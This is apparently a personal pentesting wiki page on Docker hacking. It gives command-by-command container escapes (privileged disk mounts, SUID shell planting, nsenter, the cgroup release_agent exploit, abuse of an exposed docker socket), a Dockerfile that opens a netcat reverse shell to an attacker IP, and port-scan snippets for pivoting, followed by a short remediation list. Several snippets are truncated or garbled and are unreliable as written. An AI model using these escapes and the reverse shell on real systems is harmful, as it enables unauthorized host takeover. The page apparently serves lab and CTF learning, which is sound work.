# Docker Hacking


For basic information about docker try here: [[Docker]].
Containers have networking capabilities and their own file storage. They achieve this by using three components of the Linux kernel:

-   Namespaces - segregate system resources such as processes, files, and memory away from other namespaces.
-   Cgroups - Cgroups are used by containerization software such as LXC or Docker
-   OverlayFS

Typically you are trying to escape from a  container and general these escapes stem from misconfigurations of the container from services or access controls.

## How to know when you are in a container?

[pspy](https://github.com/DominicBreuker/pspy) on Linux or Systernals proc\*-related tools or access with tasklist for windows.
```bash
ls -la / # And find:
.dockerenv

# Lack of processes
ps aux 

# Docker Processes
cat /proc/1/cgroup 
cat /proc/1/cgroup | grep docker
```

Check for mount misconfigurations. It is a misconfiguration if Docker container is running `--privileged`, meaning we are can mount to these disks as container does not need disks 
```bash
# check if disks are mountable into the host filesystem 
mount | grep /dev/sda 
mount /dev/sdaX /mnt

# If you are not root or another mn

cp /bin/sh $mount_misconfiguration_dir
# Give the binary suid privileges
chmod u+s /bin/sh  
# And PrivEsc on the host after breakout.

# Mounted Socket Escape
# Search the socket
find / -name docker.sock 2>/dev/null
# It's usually in /run/docker.sock

```

[Deepce](https://github.com/stealthcopter/deepce.git) is like PEAS-NG for Docker

Docker has a socket [[Network-Protocols]] on 5000 so that another host can send commands to it, not default, but possible.

## Preface

Add IP and domain name to /etc/hosts
```bash
echo "$IP $DOMAIN" | tee -a /etc/hosts
```

Configure Docker to trust your instance, either make `/etc/docker/daemon.json` or enter:
```json
{
	 "target-id" : ["docker-domain.name:$DOCKERPORTLOW","docker-domain.name:$DOCKERPORTHIGH"]
}
```

Control Docker(Linux)
```bash
systemctl stop docker
systemctl start docker
```

Docker Commands
```bash
RUN echo "Docker"
COPY 
````
For full list see [Commands](https://docs.docker.com/engine/reference/commandline/cli/)

## Docker Enumeration

On target machine enumerate the lay of the land:
```bash
# Docker is utilitizable on a host machine?
docker -H $remotehost $dockcmd
docker ps
docker version
docker image ls
docker config ls

# Inside a Docker Image?
#
# Get capabilities of the container from inside the container - libcap2-bin package
capsh --print 
# Check routing
ip a
```
[cli Tool](https://github.com/containers/skopeo)

[GTFOBins](https://gtfobins.github.io/gtfobins/docker/#shell) for Docker
```bash
docker images ls # list images required
```
Accessing Docker Container and exec..
```bash
docker -H $remotehost run -v /:/mnt --rm -it -d $image:$tag
docker -H $remotehost run -v /:/mnt --rm -it $image:$tag chroot /mnt sh
```

## Host to Docker Hacking 
#### Abusing Docker Registry

[Docker registries](https://docs.docker.com/registry/) are stateless server side application stores the Docker Image. Registries store and provide Docker images for use. Private registries contain various called a **tag**. The Docker Registry is a JSON endpoint query it with 

Nmap scan to find the ports to interact with the container.

```bash
# postman
GET http://$domain:$port/
````

#### Reversing Images
Download the image to reverse
```docker
docker pull app/app:$TAG
```

[Dive](https://github.com/wagoodman/dive) is a tool for exploring each layer in a docker image. 

#### Uploading Malicious Docker Images
Dockerfile 
```docker
FROM $image:

RUN apt-get update -y
RUN apt-get install netcat -y # Socat would be better!
RUN nc -c /bin/sh $IP $PORT
```
Build image
```bash
docker build
```
Then upload with push:
```
docker push
```

## Docker Escapes



#### Shared Namespaces

Namespaces segregate system resources. Have root access inside the container or potentially use [[pspy]]. Find a namespace:
```bash
ps aux
```
We then mount the namespace of the process running outside of the container with a sh shell.
```bash
nsenter --target $PID --mount sh
```

#### Misconfigured Privileges
If a docker container is running with privileged mode it bypasses the Docker engine and has direct communication with host OS. List container capabilities with:
```bash
capsh --print | grep # admin chroot sys_module sys_time
```
The commented out grep-ables indicate privilege mode. [Trailofbits PoC](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.)
```bash
# On the host
# docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 
# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Remediation:
- Do not a Docker container run with the `--privileged` flag
- Do not run as root inside the container
- use `--cap-drop=all` - [Use the “no-new-privileges” security option](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/)
- [Limit resources available to the container](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources).
- Restrict actions and syscalls with [[SELinux]], [seccomp](https://docs.docker.com/engine/security/seccomp/), [AppArmor](https://docs.docker.com/engine/security/apparmor/)
- Use official images
- Regularly rebuild images to apply security patches
#### Escaping with a Exposed Docker Daemon

Docker's use of Inter-process Communication (IPC) rather than network interface are essential for performance when transferring data to and from a Docker Container. It use Unix sockets, which has Linux file system permissions and why the requirement of a user to be part of the docker group for permissions to access the socket owned by Docker.

Exploitation of Docker Socket within the container
```bash
# Is there a docker socket?
ls -la /var/run | grep sock

# inflitrate the docker container with a bad image
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# May require CTRL+C to cancel the exploit till it works
ls /
chroot /mnt # Now go full linux pirate and board the container 
```

## Docker Hacking Utilities

## Tools

## Tricks

#### Where to escape on the network with - No ping and you need to pivot

Q: What is the Default Gateway for the Docker Container?

Use `/dev/tcp/ipaddr/port` or python

```bash
#!/bin/bash   
ports=(21 22 53 80 443 3306 8443 8080)   
for port in ${ports[@]}; do   
	timeout 1 
	bash -c "echo \"Port Scan Test\" > /dev/tcp/1.1.1.1/$port && echo $port is open || /dev/null"    
done
```


```python
#!/usr/bin/python3
import socket
host = "1.1.1.1"
portList = [21,22,53,80,443,3306,8443,8080]
for port in portList:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((host,port))
            print("Port ", port, " is open")
        except:
            print("Port ", port, " is closed")
```

Netcat
`nc -zv 192.168.100.1 1-65535`


## References

[Docker](https://docs.docker.com/get-started/overview/)
[THM Room Docker Rodeo](https://tryhackme.com/room/dockerrodeo)
[trailofbits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.)
[cgroups](https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt)
[Commands](https://docs.docker.com/engine/reference/commandline/cli/)
[Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation)
[Use the “no-new-privileges” security option](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/)
[seccomp](https://docs.docker.com/engine/security/seccomp/)
[AppArmor](https://docs.docker.com/engine/security/apparmor/)